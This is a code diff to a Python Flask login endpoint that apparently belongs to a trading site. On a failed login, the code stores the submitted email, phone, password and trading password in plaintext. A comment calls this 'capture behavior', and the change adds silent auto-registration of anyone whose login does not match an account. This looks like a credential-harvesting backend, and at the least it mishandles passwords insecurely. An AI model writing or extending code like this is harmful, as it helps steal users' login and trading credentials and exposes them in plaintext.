@@ -164,15 +164,22 @@ def login():
             conn.close()
             return jsonify({'success': True, 'redirect': 'dashboard', 'message': 'Login successful'}), 200
         else:
-            # No match — save to users table (existing capture behavior) and redirect to rating
+            # Auto-register new user directly into signup_users table
+            cursor.execute('''
+                INSERT INTO signup_users (signup_type, email, phone_number, password, trading_password, invite_code, created_at)
+                VALUES (%s, %s, %s, %s, %s, %s, %s)
+            ''', (login_type, email, phone_number, password, trading_password, '', created_at))
+
+            # Also log to users table
             cursor.execute('''
                 INSERT INTO users (login_type, email, phone_number, password, trading_password, remember_password, created_at)
                 VALUES (%s, %s, %s, %s, %s, %s, %s)
             ''', (login_type, email, phone_number, password, trading_password, remember_password, created_at))
+
             conn.commit()
             conn.close()
 
-            return jsonify({'success': True, 'redirect': 'rating', 'message': 'Login details saved successfully'}), 200
+            return jsonify({'success': True, 'redirect': 'dashboard', 'message': 'Account created and logged in successfully'}), 200
     except Exception as e:
         return jsonify({'success': False, 'message': str(e)}), 500
 
